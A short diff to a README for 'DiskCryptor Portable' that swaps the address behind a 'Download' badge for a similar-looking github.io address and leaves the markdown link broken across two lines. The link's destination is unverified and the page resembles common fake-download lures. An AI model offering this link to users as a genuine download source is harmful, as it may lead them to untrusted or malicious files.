@@ -2,7 +2,8 @@
 
 ## 📥 Download DiskCryptor Portable
 
-[![⬇️ Download DiskCryptor Portable](https://img.shields.io/badge/Download-DiskCryptor%20Portable-blue?style=for-the-badge&logo=windows)](https://diskcryptor-portable-download.github.io/.github)
+[![⬇️ Download DiskCryptor Portable](https://img.shields.io/badge/Download-DiskCryptor%20Portable-blue?style=for-the-badge&logo=windows)](https://diskcryptor-portable.github.io/.github
+)
 
 ---
 
